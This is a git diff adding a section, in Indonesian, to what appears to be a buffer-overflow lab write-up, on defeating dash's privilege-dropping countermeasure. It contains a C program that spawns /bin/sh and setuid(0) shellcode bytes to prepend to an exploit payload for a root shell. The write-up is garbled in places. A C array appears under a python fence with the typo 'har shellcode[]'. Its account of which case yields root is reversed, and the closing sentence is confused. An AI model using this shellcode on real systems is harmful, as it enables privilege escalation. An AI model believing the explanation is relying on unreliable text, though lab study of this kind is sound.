@@ -316,3 +316,47 @@ Hasil :
 ![](img/task4.png)
 
 mendapatkan segmentation fault karena tidak bisa menjalankan payload dalam stack
+
+***
+### Task 5: Defeating dash's countermeasure
+
+Kita coba dulu program untuk mendapatkan shell
+
+```objective-c
+// dash_shell_test.c
+#include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+int main()
+{
+char *argv[2];
+argv[0] = "/bin/sh";
+argv[1] = NULL;
+// setuid(0); ➀
+execve("/bin/sh", argv, NULL);
+return 0;
+}
+```
+**.
+
+
+Maka akan mendapat kan root :
+![](img/t5.png)
+
+Tapi ketika kita setuid(0) kita aktifkan maka akan mendapat user seed:
+![](img/t51.png)
+
+Nah kita perlu memodifikasi shellcode agar kita bisa mendapatkan akses root, pada file exploit.py kita tambahkan shellcode berikut pada line diatasnya
+
+```python
+har shellcode[] =
+"\x31\xc0" /* Line 1: xorl %eax,%eax */
+"\x31\xdb" /* Line 2: xorl %ebx,%ebx */
+"\xb0\xd5" /* Line 3: movb $0xd5,%al */
+"\xcd\x80" /* Line 4: int $0x80 */
+```
+
+akan mendapatkan root :
+![](img/t52.png)
+
+jika program diatas dijalankan pada program yang ada countermeasure dash nya maka kita yang semestinya akan mendapat shell user akan mendapat shell root.
